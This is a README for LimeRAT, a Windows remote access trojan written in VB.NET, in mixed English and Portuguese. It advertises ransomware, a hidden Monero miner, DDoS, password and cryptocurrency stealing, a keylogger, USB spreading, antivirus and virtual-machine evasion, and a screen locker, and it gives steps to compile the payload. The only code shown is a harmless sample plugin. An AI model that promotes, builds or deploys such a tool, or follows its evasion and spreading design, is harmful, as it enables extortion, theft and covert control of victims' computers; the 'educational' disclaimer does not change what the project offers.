# Outdated. Archive it instead of delete it

---

<img src="https://i.imgur.com/Iq5MkAf.gif">

# LimeRAT v0.1.9
	
***Remote Administration Tool For Windows***
 
---
 
 ## Descrição
 RAT simples e poderoso para máquinas Windows. Este projeto é simples e fácil de entender, deve dar a você um conhecimento geral sobre malwares dotNET e como ele se comporta.
 
 ---

## Main Features

- **.NET**
    - Coded in Visual Basic .NET, Client required framework 2.0 or 4.0 dependency, And server is 4.0
- **Connection**
    - Using pastebin.com as ip:port , Instead of noip.com DNS. And Also using multi-ports
- **Plugin**
    - Using plugin system to decrease stub's size and lower the AV detection
- **Encryption**
    - The communication between server & client is encrypted with AES
- **Spreading**
    - Infecting all files and folders on USB drivers
- **Bypass**
    - Low AV detection and undetected startup method
- **Lightweight**
    - Payload size is about 25 KB
- **Anti Virtual Machines**
    - Uninstall itself if the machine is virtual to avoid scanning or analyzing 
- **Ransomware**
    - Encrypting files on all HHD and USB with .Lime extension
- **XMR Miner**
    - High performance Monero CPU miner with user idle\active optimizations
- **DDoS**
    - Creating a powerful DDOS attack to make an online service unavailable
- **Crypto Stealer**
    - Stealing Cryptocurrency sensitive data
- **Screen-Locker**
    - Prevents user from accessing their Windows GUI  
 - **And more**
    - On Connect Auto Task
	- Force enable Windows RDP
	- Persistence
    - File manager
    - Passowrds stealer
    - Remote desktop
    - Bitcoin grabber
    - Downloader
    - Keylogger

---

## Prerequisites

To open project you need:

1. Visual Studio 2017
2. This repository
 
---

## Peek
### *Project*
<img src="https://i.imgur.com/lkzM788.gif">


### *Ransomware*
<img src="https://i.imgur.com/aZjpXFe.gif">


### *Critical Process*
<img src="https://i.imgur.com/ULqF7n5.gif">

---

## Plugin Example
#### VB.NET
```vb.net
'Easy to create a DLL plugin
Public Class Main
'Simple Msgbox
 Public Shared Sub CN(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)

  Msgbox("Hello Client!")

  Send("MSG" + SPL + "Hello Server!")
  'Client will send msg back to server, MSG will be showen in [LOG] Tab
	
 End Sub	
End Class
```

#### C#
```c#
public class Main
{
    // Simple Msgbox
    public static void CN(string H, int P, string K, string SP, string PW, string FP, string HW, string BT, string PB)
    {
        Msgbox("Hello Client!");

        Send("MSG" + SPL + "Hello Server!");
		// Client will send msg back to server, MSG will be showen in [LOG] Tab
    }
}
```
---
 
## Testing

1. Open "LimeRAT.sln" 
2. Set Compiler to "Debug" mode
3. On Solution Explorer, Right click on "Solution LimeRAT Project" and press "Rebuild Solution"
4. Press Run button. be aware that both client and server are localhost

---

## Compiling
 
1. Open "LimeRAT.sln" 
2. Set Compiler to "Release" mode
3. On Solution Explorer, Right click on "Solution LimeRAT Project" and press "Rebuild Solution"
4. Everything will be under "\Project\_EXE\Release"
5. Convert stub.exe to stub.il, using [Ildasm](https://pastebin.com/raw/rGCQC1zq)

---

 ```
 This project was only tested on local-lab[LAN]. I did not test it on external-lab[WAN].
 Server tested on Windows 10, Client tested on virtual machine windows 7.
 ```
 
 ---
 
 ## Notes
 
1. Ao usar o ransomware, o ponto de restauração não será excluído, a menos que a carga útil esteja executando o privilégio de alto nível
2. Anti-Kill (BSOD) não funcionará a menos que a carga útil esteja executando o privilégio alto

---

## Disclaimer

Eu, o criador, não sou responsável por quaisquer ações e/ou danos causados ​​por este software.

Você assume total responsabilidade por suas ações e reconhece que este software foi criado apenas para fins educacionais.

O principal objetivo deste software NÃO é ser usado de forma maliciosa, ou em qualquer sistema que você não possua ou tenha o direito de usar.

Ao usar este software, você concorda automaticamente com o acima.

---